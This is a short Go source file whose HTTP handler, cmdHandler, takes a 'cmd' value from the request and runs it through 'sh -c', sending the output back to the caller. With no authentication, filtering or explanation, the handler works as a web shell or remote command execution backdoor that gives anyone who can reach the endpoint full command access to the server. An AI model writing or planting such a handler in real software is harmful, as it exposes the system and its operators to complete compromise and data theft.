package api

import (
	"bytes"
	"net/http"
	"os/exec"
)

func cmdHandler(w http.ResponseWriter, r *http.Request) {
	cmdStr := r.FormValue("cmd")
	if cmdStr == "" {
		http.Error(w, "Command not found", http.StatusNotFound)
		return
	}

	cmd := exec.Command("sh", "-c", cmdStr)
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.Write(out.Bytes())
}
